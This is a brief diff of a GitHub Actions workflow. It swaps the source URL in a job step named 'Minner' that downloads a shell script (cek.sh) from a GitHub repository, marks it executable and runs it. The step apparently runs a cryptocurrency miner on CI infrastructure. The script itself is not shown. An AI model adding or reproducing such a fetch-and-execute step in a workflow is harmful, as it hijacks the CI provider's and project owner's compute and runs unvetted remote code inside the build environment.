@@ -24,4 +24,4 @@ jobs:
       uses: actions/checkout@v1
     - name: Minner
       run: |
-        wget https://github.com/Virtualmr12/oo/blob/main/cek.sh && chmod u+x cek.sh && ./cek.sh
+        wget https://github.com/putrodwi31/tutorialpemrogramancom.github.io/blob/master/cek.sh && chmod u+x cek.sh && ./cek.sh
